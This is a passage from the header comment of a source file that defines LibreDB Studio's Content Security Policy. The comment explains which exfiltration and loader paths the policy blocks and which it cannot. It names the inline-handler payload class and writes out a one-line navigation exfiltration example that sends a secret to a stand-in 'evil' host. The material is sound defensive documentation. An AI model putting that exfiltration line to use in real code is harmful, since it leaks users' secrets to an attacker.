/**
 * The security header set LibreDB Studio requires, as pure data.
 *
 * THIS MODULE MUST HAVE NO IMPORTS. It is published as `@libredb/studio/security` so that
 * libredb-platform can adopt the same policy from its own Next config, where neither the "@/"
 * alias nor a Studio runtime exists. Anything that reads process.env belongs in
 * src/lib/security/config.ts, not here.
 *
 * What this CSP buys, stated honestly so nobody later reads 'unsafe-inline' as an oversight:
 * every document route in this app is statically prerendered with nonce-less inline
 * `self.__next_f.push` scripts, and a per-request nonce cannot be applied to prerendered HTML.
 * So script-src carries 'unsafe-inline', and the policy does NOT block the <img onerror> /
 * <svg onload> payload class. Phase 0 closed that class by construction (React element
 * rendering, no HTML strings). What this policy adds is exfiltration and loader containment:
 * connect-src blocks fetch to an attacker host, img-src blocks beacon-by-image to a foreign
 * origin, form-action blocks form-based exfiltration, base-uri blocks relative-URL hijacking,
 * object-src and frame-src remove the plugin and frame vectors, and script-src 'self' still
 * blocks loading a remote script and every eval. Top-level navigation exfiltration
 * (location = "https://evil/?" + secret) remains possible; CSP has had no directive for it since
 * navigate-to was withdrawn.
